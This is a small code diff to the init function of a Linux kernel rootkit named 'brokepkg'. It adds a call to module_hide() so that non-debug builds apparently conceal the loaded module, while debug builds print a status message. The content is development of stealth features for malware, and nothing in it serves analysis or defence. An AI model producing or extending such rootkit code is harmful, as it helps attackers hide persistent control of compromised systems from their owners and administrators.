@@ -323,6 +323,8 @@ static int __init rootkit_init(void) {
 
 #ifdef DEBUG
   printk(KERN_INFO "brokepkg now is runing\n");
+#else
+  module_hide();
 #endif
   tidy();
 
